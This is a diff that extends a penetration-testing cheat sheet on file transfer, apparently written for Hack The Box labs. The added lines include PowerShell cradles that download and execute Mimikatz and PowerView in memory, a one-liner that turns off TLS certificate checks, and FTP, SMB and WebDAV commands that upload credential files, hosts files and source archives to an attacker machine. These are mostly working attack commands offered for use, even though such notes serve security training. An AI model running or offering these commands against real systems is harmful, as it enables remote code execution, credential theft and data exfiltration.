@@ -38,11 +38,18 @@ base64 -d file #Decode file
 
 **Windows**
 
-```
+```bash
 certutil -encode payload.dll payload.b64
 certutil -decode payload.b64 payload.dll
+
+# using powershell
+PS C:\htb> [IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("<jajajabase64here>="))  # decode
+[Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte)) # encode
+
 ```
-> To ensure that we did not mess up the file during the encoding/decoding process, we can check its md5 hash. `file <file>` `md5sum <file>`
+> To ensure that we did not mess up the file during the encoding/decoding process, we can check its md5 hash. `file <file>` `md5sum <file>` , `Get-FileHash C:\<filepath> -Algorithm md5` (on windows)
+
+>**Note:** While this method is convenient, it's not always possible to use. Windows Command Line utility (cmd.exe) has a maximum string length of 8,191 characters. Also, a web shell may error if you attempt to send extremely large strings.
 
 ## HTTP
 
@@ -66,11 +73,40 @@ bitsadmin /transfer transfName /priority high http://example.com/examplefile.pdf
 Invoke-WebRequest "http://10.10.14.2:80/taskkill.exe" -OutFile "taskkill.exe"
 wget "http://10.10.14.2/nc.bat.exe" -OutFile "C:\ProgramData\unifivideo\taskkill.exe"
 
+# Fileless Method (run it directly in memory)
+IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')  
+(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX # pipeline input.
+
 Import-Module BitsTransfer
 Start-BitsTransfer -Source $url -Destination $output
 #OR
 Start-BitsTransfer -Source $url -Destination $output -Asynchronous
 ```
+ > when the Internet Explorer first-launch configuration has not been completed, which prevents the download This can be bypassed using the parameter `-UseBasicParsing`.
+ 
+```bash
+Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
+```
+ 
+>Another error in PowerShell downloads is related to the SSL/TLS secure channel if the certificate is not trusted. We can bypass that error with the following command:
+
+Windows File Transfer Methods
+
+```powershell-session
+PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
+
+Exception calling "DownloadString" with "1" argument(s): "The underlying connection was closed: Could not establish trust
+relationship for the SSL/TLS secure channel."
+At line:1 char:1
++ IEX(New-Object Net.WebClient).DownloadString('https://raw.githubuserc ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
+    + FullyQualifiedErrorId : WebException
+PS C:\htb> [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
+```
+
+
+Harmj0y has compiled an extensive list of PowerShell download cradles [here](https://gist.github.com/HarmJ0y/bb48307ffa663256e239). It is worth gaining familiarity with them and their nuances, such as a lack of proxy awareness or touching disk (downloading a file onto the target) to select the appropriate one for the situation.
 
 ### Upload files
 
@@ -89,6 +125,8 @@ python3 -m uploadserver
 curl -X POST http://HOST/upload -F 'files=@file.txt' 
 # With basic auth:
 # curl -X POST http://HOST/upload -H -F 'files=@file.txt' -u hello:world
+
+Invoke-FileUpload -Uri http://HOST/upload -File <path>  # powershell
 ```
 
 ### **HTTPS Server**
@@ -140,7 +178,8 @@ if __name__ == "__main__":
 
 ```bash
 pip3 install pyftpdlib
-python3 -m pyftpdlib -p 21
+python3 -m pyftpdlib -p 21 # Anonymous authentication is enabled by default
+python3 -m pyftpdlib --port 21 --write # allow upload file to the server
 ```
 
 ### FTP server (NodeJS)
@@ -172,13 +211,21 @@ chown -R ftpuser:ftpgroup /ftphome/
 
 ### **Windows** client
 
+using powershell
+```bash
+(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
+
+(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts') # upload
+``` 
+with cmd
 ```bash
 #Work well with python. With pure-ftp use fusr:ftp
 echo open 10.11.0.41 21 > ftp.txt
 echo USER anonymous >> ftp.txt
 echo anonymous >> ftp.txt
 echo bin >> ftp.txt
-echo GET mimikatz.exe >> ftp.txt
+echo GET mimikatz.exe >> ftp.txt            # download
+echo PUT uploaded_creds.txt >> uploaded.txt # upload file to pwnbox
 echo bye >> ftp.txt
 ftp -n -v -s:ftp.txt
 ```
@@ -190,14 +237,18 @@ Kali as server
 ```bash
 kali_op1> impacket-smbserver -smb2support kali `pwd` # Share current directory
 kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
+sudo impacket-smbserver share -smb2support /tmp/smbshare # share spesifice folder
+
 #For new Win10 versions
-impacket-smbserver -smb2support -user test -password test test `pwd`
+impacket-smbserver -smb2support -user test -password test test `pwd` 
+sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test # spesifice folder
+
 # or 
 python /usr/share/doc/python3-impacket/examples/smbserver.py tmp .
 
 #copy of a file from the shared folder 
-smbclient //localhost/tmp -U guest -c 'get file.txt'
-
+smbclient //HOST/tmp -U guest -c 'get file.txt'
+sudo mount -t cifs //HOST/tmp /mnt -o user=guest
 ```
 
 Or create a smb share **using samba**:
@@ -231,7 +282,16 @@ copy C:\path\to\file.txt \\<Linux_IP>\shared\file.txt # from windows to linux
 WindPS-1> New-PSDrive -Name "new_disk" -PSProvider "FileSystem" -Root "\\10.10.14.9\kali"
 WindPS-2> cd new_disk:
 ```
+Commonly enterprises don't allow the SMB protocol (TCP/445) out of their internal network because this can open them up to potential attacks.An alternative is to run SMB over HTTP with `WebDav`, The `WebDAV` protocol enables a webserver to behave like a fileserver, supporting collaborative content authoring. `WebDAV` can also use HTTPS.
+```bash
+# open pwnbox , setup upload server
+sudo pip3 install wsgidav cheroot
+sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous # setup server
 
+# Now we can attempt to connect to the share using the `DavWWWRoot` directory.
+# dir \\192.168.49.128\DavWWWRoot # check the folder before upload 
+copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\ # upload
+```
 ## SCP
 
 The attacker has to have SSHd running.
